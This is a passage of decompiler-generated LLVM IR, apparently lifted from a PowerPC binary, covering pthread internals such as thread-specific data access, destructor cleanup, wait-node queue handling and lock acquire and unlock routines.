  store i32 %v1_100095c4, i32* @r11, align 4
  %v2_100095cc = add i32 %v1_100095c4, ptrtoint (i32* @global_var_1002f62c.341 to i32)
  %v3_100095cc = inttoptr i32 %v2_100095cc to i32*
  %v4_100095cc = load i32, i32* %v3_100095cc, align 4
  store i32 %v4_100095cc, i32* %r0.global-to-local, align 4
  store i32 %v2_100095cc, i32* @r8, align 4
  %v3_100095d4 = icmp eq i32 %v4_100095cc, 0
  br i1 %v3_100095d4, label %dec_label_pc_100095dc, label %dec_label_pc_100095ec

dec_label_pc_100095dc:                            ; preds = %dec_label_pc_100095c0, %entry
  %v0_100095dc = load i32, i32* @r30, align 4
  store i32 %v0_100095dc, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100095e4.348 to i32), i32* @lr, align 4
  %v0_100095e0 = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_10009650

dec_label_pc_100095ec:                            ; preds = %dec_label_pc_100095c0
  %v3_100095f0 = load i32, i32* @global_var_1002ef34.220, align 4
  store i32 %v3_100095f0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r9, align 4
  store i32 0, i32* %v3_100095cc, align 4
  %v0_100095fc = load i32, i32* %r0.global-to-local, align 4
  %v3_100095fc = icmp eq i32 %v0_100095fc, -1
  %v0_10009600 = load i32, i32* @r9, align 4
  %v1_10009600 = load i32, i32* @r8, align 4
  %v2_10009600 = add i32 %v1_10009600, 4
  %v3_10009600 = inttoptr i32 %v2_10009600 to i32*
  store i32 %v0_10009600, i32* %v3_10009600, align 4
  br i1 %v3_100095fc, label %dec_label_pc_10009640, label %dec_label_pc_10009608

dec_label_pc_10009608:                            ; preds = %dec_label_pc_100095ec
  %v1_10009608 = call i32 @__asm_rlwinm(i32 %arg1, i32 2, i32 25, i32 29)
  %v0_1000960c = load i32, i32* @r29, align 4
  store i32 %v0_1000960c, i32* @r9, align 4
  %v1_10009610 = call i32 @__asm_rlwinm(i32 %arg1, i32 29, i32 3, i32 29)
  %v0_10009614.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_10009614

dec_label_pc_10009614:                            ; preds = %dec_label_pc_10009634, %dec_label_pc_10009608
  %v0_10009614 = phi i32 [ %v2_10009634, %dec_label_pc_10009634 ], [ %v0_10009614.pre, %dec_label_pc_10009608 ]
  %v1_10009614 = add i32 %v0_10009614, 44
  %v2_10009614 = inttoptr i32 %v1_10009614 to i8*
  %v3_10009614 = load i8, i8* %v2_10009614, align 1
  %v4_10009614 = zext i8 %v3_10009614 to i32
  store i32 %v4_10009614, i32* %r0.global-to-local, align 4
  %v2_10009618 = add i32 %v0_10009614, %v1_10009610
  store i32 %v2_10009618, i32* @r11, align 4
  %v3_1000961c = icmp eq i8 %v3_10009614, 0
  br i1 %v3_1000961c, label %dec_label_pc_10009624, label %dec_label_pc_10009634

dec_label_pc_10009624:                            ; preds = %dec_label_pc_10009614
  %v1_10009624 = add i32 %v2_10009618, 236
  %v2_10009624 = inttoptr i32 %v1_10009624 to i32*
  %v3_10009624 = load i32, i32* %v2_10009624, align 4
  store i32 %v3_10009624, i32* @r11, align 4
  %v3_10009628 = icmp eq i32 %v3_10009624, 0
  br i1 %v3_10009628, label %dec_label_pc_10009634, label %dec_label_pc_10009630

dec_label_pc_10009630:                            ; preds = %dec_label_pc_10009624
  %v3_10009630 = add i32 %v3_10009624, %v1_10009608
  %v4_10009630 = inttoptr i32 %v3_10009630 to i32*
  store i32 %v4_10009614, i32* %v4_10009630, align 4
  %v0_10009634.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_10009634

dec_label_pc_10009634:                            ; preds = %dec_label_pc_10009614, %dec_label_pc_10009624, %dec_label_pc_10009630
  %v0_10009634 = phi i32 [ %v0_10009614, %dec_label_pc_10009614 ], [ %v0_10009614, %dec_label_pc_10009624 ], [ %v0_10009634.pre, %dec_label_pc_10009630 ]
  %v1_10009634 = inttoptr i32 %v0_10009634 to i32*
  %v2_10009634 = load i32, i32* %v1_10009634, align 4
  store i32 %v2_10009634, i32* @r9, align 4
  %v1_10009638 = load i32, i32* @r29, align 4
  %v4_10009638 = icmp eq i32 %v2_10009634, %v1_10009638
  br i1 %v4_10009638, label %dec_label_pc_10009640, label %dec_label_pc_10009614

dec_label_pc_10009640:                            ; preds = %dec_label_pc_10009634, %dec_label_pc_100095ec
  store i32 ptrtoint (i32* @global_var_1003162c.343 to i32), i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000964c.349 to i32), i32* @lr, align 4
  %v0_10009648 = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_10009650

dec_label_pc_10009650:                            ; preds = %dec_label_pc_100095dc, %dec_label_pc_10009640
  %storemerge = phi i32 [ 22, %dec_label_pc_100095dc ], [ 0, %dec_label_pc_10009640 ]
  store i32 %v0_10009594, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10009634, { 1, 2, 0 }
  uselistorder i32 %v0_10009614, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100095c4, { 1, 0 }
  uselistorder i32* @global_var_1002ef34.220, { 4, 5, 6, 7, 8, 0, 9, 1, 10, 2, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20 }
  uselistorder i32 ptrtoint (i32* @global_var_1003162c.343 to i32), { 2, 0, 3, 4, 5, 1, 6 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10009650, { 1, 0 }
  uselistorder label %dec_label_pc_10009634, { 2, 1, 0 }
}

define i32 @__pthread_internal_tsd_address(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10009664 = mul i32 %arg1, 4
  %v1_10009668 = load i32, i32* @r2, align 4
  %v2_10009668 = add i32 %v1_10009664, 364
  %v1_1000966c = add i32 %v2_10009668, %v1_10009668
  ret i32 %v1_1000966c
}

define i32 @__pthread_internal_tsd_get(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10009674 = mul i32 %arg1, 4
  %v1_10009678 = load i32, i32* @r2, align 4
  %v2_10009678 = add i32 %v1_10009678, %v1_10009674
  %v1_1000967c = add i32 %v2_10009678, 364
  %v2_1000967c = inttoptr i32 %v1_1000967c to i32*
  %v3_1000967c = load i32, i32* %v2_1000967c, align 4
  ret i32 %v3_1000967c
}

define i32 @__pthread_internal_tsd_set(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_10009684 = mul i32 %arg1, 4
  %v1_10009688 = load i32, i32* @r2, align 4
  %v2_10009688 = add i32 %v1_10009684, 364
  %v2_1000968c = add i32 %v2_10009688, %v1_10009688
  %v3_1000968c = inttoptr i32 %v2_1000968c to i32*
  store i32 %arg2, i32* %v3_1000968c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 364, { 0, 2, 1 }
}

define i32 @__pthread_destroy_specifics(i32 %arg1) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 1, i32* @r8, align 4
  %v0_100096a8 = load i32, i32* @r2, align 4
  store i32 %v0_100096a8, i32* @r29, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000974c

dec_label_pc_100096b8:                            ; preds = %dec_label_pc_10009754, %dec_label_pc_10009734
  %v0_10009744.pr16 = phi i32 [ 0, %dec_label_pc_10009754 ], [ %v0_10009744.pr, %dec_label_pc_10009734 ]
  %v1_100096c0 = phi i32 [ %v1_100096c03, %dec_label_pc_10009754 ], [ %v1_100096c04, %dec_label_pc_10009734 ]
  %v0_100096b8 = phi i32 [ 0, %dec_label_pc_10009754 ], [ %v1_10009734, %dec_label_pc_10009734 ]
  %v1_100096b8 = mul i32 %v0_100096b8, 4
  store i32 0, i32* %r30.global-to-local, align 4
  %v2_100096c0 = add i32 %v1_100096b8, %v1_100096c0
  %v1_100096c4 = add i32 %v2_100096c0, 236
  %v2_100096c4 = inttoptr i32 %v1_100096c4 to i32*
  %v3_100096c4 = load i32, i32* %v2_100096c4, align 4
  %v3_100096c8 = icmp eq i32 %v3_100096c4, 0
  br i1 %v3_100096c8, label %dec_label_pc_10009734, label %dec_label_pc_10009704.outer

dec_label_pc_100096d4:                            ; preds = %dec_label_pc_10009704
  %v2_1000970c = add i32 %v1_10009704, %v0_10009724
  %v1_10009714 = mul i32 %v2_1000970c, 8
  %v1_100096d4 = add i32 %v1_10009714, add (i32 ptrtoint (i32* @global_var_1002f62c.341 to i32), i32 4)
  %v2_100096d4 = inttoptr i32 %v1_100096d4 to i32*
  %v3_100096d4 = load i32, i32* %v2_100096d4, align 4
  %v3_100096dc = icmp eq i32 %v3_100096d4, 0
  br i1 %v3_100096dc, label %dec_label_pc_10009704, label %dec_label_pc_100096f0

dec_label_pc_100096f0:                            ; preds = %dec_label_pc_100096d4
  %v3_100096d8 = load i32, i32* %v2_100096d8, align 4
  %v2_100096e0 = add i32 %v3_100096d8, %v1_10009724
  %v3_100096e0 = inttoptr i32 %v2_100096e0 to i32*
  store i32 0, i32* %v3_100096e0, align 4
  call void @__pseudo_call(i32 %v3_100096d4)
  store i32 1, i32* @r8, align 4
  %v0_10009704.pre.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10009708.pre.pre = load i32, i32* %r30.global-to-local, align 4
  %v1_10009728.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10009704.outer

dec_label_pc_10009704.outer:                      ; preds = %dec_label_pc_100096b8, %dec_label_pc_100096f0
  %v0_10009744.pr14.ph = phi i32 [ 1, %dec_label_pc_100096f0 ], [ %v0_10009744.pr16, %dec_label_pc_100096b8 ]
  %v1_10009728.ph = phi i32 [ %v1_10009728.pre.pre, %dec_label_pc_100096f0 ], [ %v1_100096c0, %dec_label_pc_100096b8 ]
  %v0_10009724.ph = phi i32 [ %v0_10009708.pre.pre, %dec_label_pc_100096f0 ], [ 0, %dec_label_pc_100096b8 ]
  %v0_10009720.ph = phi i32 [ %v0_10009704.pre.pre, %dec_label_pc_100096f0 ], [ %v0_100096b8, %dec_label_pc_100096b8 ]
  %v1_10009704 = mul i32 %v0_10009720.ph, 32
  %v1_10009720 = mul i32 %v0_10009720.ph, 4
  %v2_10009728 = add i32 %v1_10009720, %v1_10009728.ph
  %v1_100096d8 = add i32 %v2_10009728, 236
  %v2_100096d8 = inttoptr i32 %v1_100096d8 to i32*
  br label %dec_label_pc_10009704

dec_label_pc_10009704:                            ; preds = %dec_label_pc_10009704.outer, %dec_label_pc_100096d4
  %v0_10009724 = phi i32 [ %v1_1000972c, %dec_label_pc_100096d4 ], [ %v0_10009724.ph, %dec_label_pc_10009704.outer ]
  %v1_10009724 = mul i32 %v0_10009724, 4
  store i32 %v1_10009724, i32* @r10, align 4
  %v1_1000972c = add i32 %v0_10009724, 1
  store i32 %v1_1000972c, i32* %r30.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_10009724, 32
  br i1 %tmp20, label %dec_label_pc_100096d4, label %dec_label_pc_10009734.loopexit

dec_label_pc_10009734.loopexit:                   ; preds = %dec_label_pc_10009704
  br label %dec_label_pc_10009734

dec_label_pc_10009734:                            ; preds = %dec_label_pc_10009734.loopexit, %dec_label_pc_100096b8
  %v0_10009744.pr = phi i32 [ %v0_10009744.pr16, %dec_label_pc_100096b8 ], [ %v0_10009744.pr14.ph, %dec_label_pc_10009734.loopexit ]
  %v0_10009734 = phi i32 [ %v0_100096b8, %dec_label_pc_100096b8 ], [ %v0_10009720.ph, %dec_label_pc_10009734.loopexit ]
  %v1_100096c04 = phi i32 [ %v1_100096c0, %dec_label_pc_100096b8 ], [ %v1_10009728.ph, %dec_label_pc_10009734.loopexit ]
  %v1_10009734 = add i32 %v0_10009734, 1
  store i32 %v1_10009734, i32* %r31.global-to-local, align 4
  %tmp21 = icmp slt i32 %v1_10009734, 32
  br i1 %tmp21, label %dec_label_pc_100096b8, label %dec_label_pc_10009740

dec_label_pc_10009740:                            ; preds = %dec_label_pc_10009734
  %v0_10009740 = load i32, i32* %r28.global-to-local, align 4
  %v1_10009740 = add i32 %v0_10009740, 1
  store i32 %v1_10009740, i32* %r28.global-to-local, align 4
  %v3_10009744 = icmp eq i32 %v0_10009744.pr, 0
  br i1 %v3_10009744, label %dec_label_pc_10009760, label %dec_label_pc_1000974c

dec_label_pc_1000974c:                            ; preds = %entry, %dec_label_pc_10009740
  %v1_100096c03 = phi i32 [ %v0_100096a8, %entry ], [ %v1_100096c04, %dec_label_pc_10009740 ]
  %v0_1000974c = phi i32 [ 0, %entry ], [ %v1_10009740, %dec_label_pc_10009740 ]
  %v2_1000974c = icmp sgt i32 %v0_1000974c, 3
  br i1 %v2_1000974c, label %dec_label_pc_10009760, label %dec_label_pc_10009754

dec_label_pc_10009754:                            ; preds = %dec_label_pc_1000974c
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_100096b8

dec_label_pc_10009760:                            ; preds = %dec_label_pc_1000974c, %dec_label_pc_10009740
  %v0_10009760 = phi i32 [ %v1_100096c03, %dec_label_pc_1000974c ], [ %v1_100096c04, %dec_label_pc_10009740 ]
  %v1_10009760 = add i32 %v0_10009760, 28
  %v2_10009760 = inttoptr i32 %v1_10009760 to i32*
  %v3_10009760 = load i32, i32* %v2_10009760, align 4
  store i32 %v3_10009760, i32* @r3, align 4
  store i32 %v0_10009760, i32* @r4, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10009770.351 to i32), i32* @lr, align 4
  %v0_1000976c = call i32 @__pthread_lock()
  br label %dec_label_pc_10009790

dec_label_pc_10009774:                            ; preds = %dec_label_pc_10009790
  %v1_10009774 = add i32 %v2_10009798, 236
  %v2_10009774 = inttoptr i32 %v1_10009774 to i32*
  %v3_10009774 = load i32, i32* %v2_10009774, align 4
  %v3_10009778 = icmp eq i32 %v3_10009774, 0
  store i32 %v3_10009774, i32* @r3, align 4
  br i1 %v3_10009778, label %dec_label_pc_10009790, label %dec_label_pc_10009784

dec_label_pc_10009784:                            ; preds = %dec_label_pc_10009774
  store i32 ptrtoint (i32* @global_var_10009788.352 to i32), i32* @lr, align 4
  %v0_10009784 = call i32 @free()
  %v1_1000978c = load i32, i32* @r30, align 4
  %v2_1000978c = add i32 %v1_1000978c, 12
  %v3_1000978c = inttoptr i32 %v2_1000978c to i32*
  store i32 0, i32* %v3_1000978c, align 4
  br label %dec_label_pc_10009790

dec_label_pc_10009790:                            ; preds = %dec_label_pc_10009774, %dec_label_pc_10009784, %dec_label_pc_10009760
  %v0_10009790 = load i32, i32* @r31, align 4
  %v1_10009794 = mul i32 %v0_10009790, 4
  %v1_10009798 = load i32, i32* @r29, align 4
  %v2_10009798 = add i32 %v1_10009798, %v1_10009794
  %v1_1000979c = add i32 %v0_10009790, 1
  store i32 %v1_1000979c, i32* @r31, align 4
  %v1_100097a0 = add i32 %v2_10009798, 224
  store i32 %v1_100097a0, i32* @r30, align 4
  %tmp22 = icmp slt i32 %v0_10009790, 32
  br i1 %tmp22, label %dec_label_pc_10009774, label %dec_label_pc_100097a8

dec_label_pc_100097a8:                            ; preds = %dec_label_pc_10009790
  %v1_100097a8 = add i32 %v1_10009798, 28
  %v2_100097a8 = inttoptr i32 %v1_100097a8 to i32*
  %v3_100097a8 = load i32, i32* %v2_100097a8, align 4
  store i32 %v3_100097a8, i32* @r3, align 4
  store i32 268474288, i32* @lr, align 4
  %v0_100097ac = call i32 @__pthread_unlock()
  ret i32 %v0_100097ac

; uselistorder directives
  uselistorder i32 %v2_10009798, { 1, 0 }
  uselistorder i32 %v0_10009790, { 1, 2, 0 }
  uselistorder i32 %v0_10009760, { 1, 0 }
  uselistorder i32 %v1_10009734, { 1, 2, 0 }
  uselistorder i32 %v1_1000972c, { 1, 0 }
  uselistorder i32 %v0_10009724, { 2, 3, 0, 1 }
  uselistorder i32 %v0_10009720.ph, { 1, 0, 2 }
  uselistorder i32 %v0_100096b8, { 2, 1, 0 }
  uselistorder i32 %v1_100096c0, { 2, 0, 1 }
  uselistorder i32 %v0_10009744.pr16, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @__pthread_unlock, { 8, 10, 9, 43, 42, 41, 40, 39, 38, 37, 46, 17, 15, 14, 16, 4, 36, 47, 35, 45, 34, 33, 32, 31, 30, 3, 2, 0, 7, 6, 5, 1, 29, 44, 12, 28, 27, 13, 11, 26, 25, 24, 23, 22, 21, 20, 19, 18 }
  uselistorder i32 ()* @__pthread_lock, { 6, 10, 29, 28, 16, 32, 14, 13, 15, 12, 11, 3, 2, 27, 33, 26, 31, 25, 24, 1, 5, 4, 0, 23, 30, 8, 22, 21, 9, 7, 20, 19, 18, 17 }
  uselistorder label %dec_label_pc_10009790, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000974c, { 1, 0 }
  uselistorder label %dec_label_pc_10009704.outer, { 1, 0 }
}

define i32 @pthread_getspecific(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %v2_100097c4 = icmp ugt i32 %arg1, 1023
  %v1_100097c8 = call i32 @__asm_rlwinm(i32 %arg1, i32 29, i32 3, i32 29)
  store i32 %v1_100097c8, i32* %r0.global-to-local, align 4
  %v1_100097cc = load i32, i32* @r2, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br i1 %v2_100097c4, label %dec_label_pc_10009804, label %dec_label_pc_100097d8

dec_label_pc_100097d8:                            ; preds = %entry
  %v2_100097cc = add i32 %v1_100097cc, %v1_100097c8
  %v1_100097d8 = add i32 %v2_100097cc, 236
  %v2_100097d8 = inttoptr i32 %v1_100097d8 to i32*
  %v3_100097d8 = load i32, i32* %v2_100097d8, align 4
  store i32 %v3_100097d8, i32* %r11.global-to-local, align 4
  %v1_100097dc = mul i32 %arg1, 8
  store i32 %v1_100097dc, i32* %r0.global-to-local, align 4
  %v3_100097e0 = icmp eq i32 %v3_100097d8, 0
  br i1 %v3_100097e0, label %dec_label_pc_10009804, label %dec_label_pc_100097e8

dec_label_pc_100097e8:                            ; preds = %dec_label_pc_100097d8
  %v1_100097ec = call i32 @__asm_rlwinm(i32 %arg1, i32 2, i32 25, i32 29)
  %v1_100097f4 = load i32, i32* %r0.global-to-local, align 4
  %v2_100097f4 = add i32 %v1_100097f4, ptrtoint (i32* @global_var_1002f62c.341 to i32)
  %v3_100097f4 = inttoptr i32 %v2_100097f4 to i32*
  %v4_100097f4 = load i32, i32* %v3_100097f4, align 4
  store i32 %v4_100097f4, i32* %r0.global-to-local, align 4
  %v3_100097f8 = icmp eq i32 %v4_100097f4, 0
  br i1 %v3_100097f8, label %dec_label_pc_100097e8.dec_label_pc_10009804_crit_edge, label %dec_label_pc_10009800

dec_label_pc_100097e8.dec_label_pc_10009804_crit_edge: ; preds = %dec_label_pc_100097e8
  %v0_10009804.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009804

dec_label_pc_10009800:                            ; preds = %dec_label_pc_100097e8
  %v1_10009800 = load i32, i32* %r11.global-to-local, align 4
  %v2_10009800 = add i32 %v1_10009800, %v1_100097ec
  %v3_10009800 = inttoptr i32 %v2_10009800 to i32*
  %v4_10009800 = load i32, i32* %v3_10009800, align 4
  store i32 %v4_10009800, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009804

dec_label_pc_10009804:                            ; preds = %dec_label_pc_100097e8.dec_label_pc_10009804_crit_edge, %dec_label_pc_100097d8, %entry, %dec_label_pc_10009800
  %v0_10009804 = phi i32 [ %v0_10009804.pre, %dec_label_pc_100097e8.dec_label_pc_10009804_crit_edge ], [ 0, %dec_label_pc_100097d8 ], [ 0, %entry ], [ %v4_10009800, %dec_label_pc_10009800 ]
  ret i32 %v0_10009804

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_1002f62c.341 to i32), { 4, 1, 5, 6, 8, 0, 2, 3, 7 }
  uselistorder i32 236, { 2, 1, 5, 6, 3, 4, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10009804, { 3, 0, 1, 2 }
}

define i32 @wait_node_dequeue(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v4_1000980c = icmp eq i32 %tmp, %arg1
  %v1_10009814 = inttoptr i32 %arg3 to i32*
  br i1 %v4_1000980c, label %dec_label_pc_10009818, label %dec_label_pc_10009850

dec_label_pc_10009818:                            ; preds = %entry
  %r9.promoted = load i32, i32* @r9, align 4
  %v5_1000981c = icmp eq i32 %r9.promoted, %arg3
  %v0_10009834 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v5_1000981c, i32 %v0_10009834)
  %v0_100098441 = load i32, i32* %r4.global-to-local, align 4
  %v1_100098442 = inttoptr i32 %v0_100098441 to i32*
  %v2_100098443 = load i32, i32* %v1_100098442, align 4
  %v4_100098486 = icmp eq i32 %v2_100098443, %arg3
  br i1 %v4_100098486, label %dec_label_pc_10009850, label %dec_label_pc_1000983c

dec_label_pc_1000983c:                            ; preds = %dec_label_pc_10009818, %dec_label_pc_1000983c
  %v0_1000983c = phi i32 [ %v2_10009844, %dec_label_pc_1000983c ], [ %v2_100098443, %dec_label_pc_10009818 ]
  store i32 %v0_1000983c, i32* %r4.global-to-local, align 4
  %v1_10009844 = inttoptr i32 %v0_1000983c to i32*
  %v2_10009844 = load i32, i32* %v1_10009844, align 4
  %v4_10009848 = icmp eq i32 %v2_10009844, %arg3
  br i1 %v4_10009848, label %dec_label_pc_10009844.dec_label_pc_10009850.loopexit_crit_edge, label %dec_label_pc_1000983c

dec_label_pc_10009844.dec_label_pc_10009850.loopexit_crit_edge: ; preds = %dec_label_pc_1000983c
  br label %dec_label_pc_10009850

dec_label_pc_10009850:                            ; preds = %entry, %dec_label_pc_10009818, %dec_label_pc_10009844.dec_label_pc_10009850.loopexit_crit_edge
  %v1_10009854 = phi i32 [ %v0_1000983c, %dec_label_pc_10009844.dec_label_pc_10009850.loopexit_crit_edge ], [ %v0_100098441, %dec_label_pc_10009818 ], [ %tmp, %entry ]
  %v2_10009850 = load i32, i32* %v1_10009814, align 4
  %v2_10009854 = inttoptr i32 %v1_10009854 to i32*
  store i32 %v2_10009850, i32* %v2_10009854, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v2_10009844, { 1, 0 }
  uselistorder i32 %v0_1000983c, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10009850, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000983c, { 1, 0 }
}

define i32 @__pthread_acquire(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10009868 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10009868, i32* @r30, align 4
  store i32 0, i32* @r31, align 4
  %v2_10009888 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_100098b4

dec_label_pc_1000987c:                            ; preds = %dec_label_pc_100098b4
  %v2_100098d0 = icmp sgt i32 %v0_100098d0, 49
  %v1_10009880 = add i32 %v0_100098d0, 1
  store i32 %v1_10009880, i32* @r31, align 4
  store i32 %v2_10009888, i32* %r3.global-to-local, align 4
  br i1 %v2_100098d0, label %dec_label_pc_1000989c, label %dec_label_pc_10009894

dec_label_pc_10009894:                            ; preds = %dec_label_pc_1000987c
  store i32 ptrtoint (i32* @global_var_10009898.353 to i32), i32* @lr, align 4
  %v2_10009894 = call i32 @sched_yield(i32 %v2_10009888, i32 0)
  br label %dec_label_pc_100098ac.backedge

dec_label_pc_1000989c:                            ; preds = %dec_label_pc_1000987c
  store i32 0, i32* %stack_var_-24, align 4
  store i32 0, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_100098ac.354 to i32), i32* @lr, align 4
  %v2_100098a8 = call i32 @nanosleep(i32 %v2_10009888, i32 0)
  br label %dec_label_pc_100098ac.backedge

dec_label_pc_100098ac.backedge:                   ; preds = %dec_label_pc_1000989c, %dec_label_pc_10009894
  %storemerge = phi i32 [ %v2_10009894, %dec_label_pc_10009894 ], [ %v2_100098a8, %dec_label_pc_1000989c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_100098d0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100098b4

dec_label_pc_100098b4:                            ; preds = %entry, %dec_label_pc_100098ac.backedge
  %v0_100098d0 = phi i32 [ %v0_100098d0.pre, %dec_label_pc_100098ac.backedge ], [ 0, %entry ]
  %v0_100098e8 = phi i32 [ %storemerge, %dec_label_pc_100098ac.backedge ], [ %v0_10009868, %entry ]
  %r11.promoted = load i32, i32* @r11, align 4
  %v5_100098b8 = icmp eq i32 %r11.promoted, 0
  br i1 %v5_100098b8, label %dec_label_pc_100098d8, label %dec_label_pc_1000987c

dec_label_pc_100098d8:                            ; preds = %dec_label_pc_100098b4
  ret i32 %v0_100098e8

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_100098b4, { 1, 0 }
}

define i32 @wait_node_free(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 268474636, i32* @lr, align 4
  %v1_10009908 = call i32 @__pthread_acquire(i32 ptrtoint (i32* @global_var_1002f048.355 to i32))
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  %v3_10009910 = load i32, i32* @global_var_1002f044.356, align 4
  %v1_10009914 = load i32, i32* @r28, align 4
  %v2_10009914 = inttoptr i32 %v1_10009914 to i32*
  store i32 %v3_10009910, i32* %v2_10009914, align 4
  %v0_10009918 = load i32, i32* @r28, align 4
  store i32 %v0_10009918, i32* @global_var_1002f044.356, align 4
  store i32 0, i32* @global_var_1002f048.355, align 4
  ret i32 %v1_10009908
}

define i32 @restart.9(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268474704, i32* @lr, align 4
  %v0_1000994c = call i32 @__pthread_restart_new()
  ret i32 %v0_1000994c

; uselistorder directives
  uselistorder i32 ()* @__pthread_restart_new, { 0, 5, 4, 1, 2, 3 }
}

define i32 @__pthread_alt_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10009960 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  br label %dec_label_pc_10009978.outer

dec_label_pc_10009978.outer:                      ; preds = %dec_label_pc_10009a40, %dec_label_pc_10009a2c, %entry
  %v0_10009a247.ph = phi i32 [ %tmp, %entry ], [ %v0_10009a24, %dec_label_pc_10009a2c ], [ %v0_10009a24, %dec_label_pc_10009a40 ]
  %v1_10009978 = inttoptr i32 %v0_10009a247.ph to i32*
  br label %dec_label_pc_10009978

dec_label_pc_10009978:                            ; preds = %dec_label_pc_10009978.outer, %dec_label_pc_1000998c
  %v2_10009978 = load i32, i32* %v1_10009978, align 4
  %v2_1000997c = icmp ugt i32 %v2_10009978, 1
  br i1 %v2_1000997c, label %dec_label_pc_100099c8.lr.ph, label %dec_label_pc_1000998c

dec_label_pc_1000998c:                            ; preds = %dec_label_pc_10009978
  %r9.promoted = load i32, i32* @r9, align 4
  %.pre = xor i32 %r9.promoted, %v2_10009978
  %v5_10009990 = icmp eq i32 %.pre, 0
  store i32 %.pre, i32* @r9, align 4
  br i1 %v5_10009990, label %dec_label_pc_10009a84.loopexit, label %dec_label_pc_10009978

dec_label_pc_100099c8.lr.ph:                      ; preds = %dec_label_pc_10009978
  store i32 %v2_10009978, i32* @r31, align 4
  store i32 -2147483648, i32* @r27, align 4
  store i32 %v2_10009978, i32* @r28, align 4
  store i32 %v0_10009a247.ph, i32* @r26, align 4
  br label %dec_label_pc_100099c8

dec_label_pc_100099c8:                            ; preds = %dec_label_pc_100099c8.lr.ph, %dec_label_pc_10009a18.backedge
  %v0_10009a08 = phi i32 [ %v0_10009a247.ph, %dec_label_pc_100099c8.lr.ph ], [ %v0_10009a20, %dec_label_pc_10009a18.backedge ]
  %v0_10009a2411 = phi i32 [ %v0_10009a247.ph, %dec_label_pc_100099c8.lr.ph ], [ %v0_10009a24, %dec_label_pc_10009a18.backedge ]
  %v0_10009a10 = phi i32 [ %v2_10009978, %dec_label_pc_100099c8.lr.ph ], [ %storemerge, %dec_label_pc_10009a18.backedge ]
  %v1_100099c8 = add i32 %v0_10009a10, 8
  %v2_100099c8 = inttoptr i32 %v1_100099c8 to i32*
  %v3_100099c8 = load i32, i32* %v2_100099c8, align 4
  %v3_100099cc = icmp eq i32 %v3_100099c8, 0
  br i1 %v3_100099cc, label %dec_label_pc_100099f4, label %dec_label_pc_100099d4

dec_label_pc_100099d4:                            ; preds = %dec_label_pc_100099c8
  store i32 268474840, i32* @lr, align 4
  %v3_100099d4 = inttoptr i32 %v0_10009a08 to i32*
  %v4_100099d4 = call i32 @wait_node_dequeue(i32 %v0_10009a2411, i32* %v3_100099d4, i32 %v0_10009a10)
  %v0_100099d8 = load i32, i32* @r31, align 4
  store i32 268474848, i32* @lr, align 4
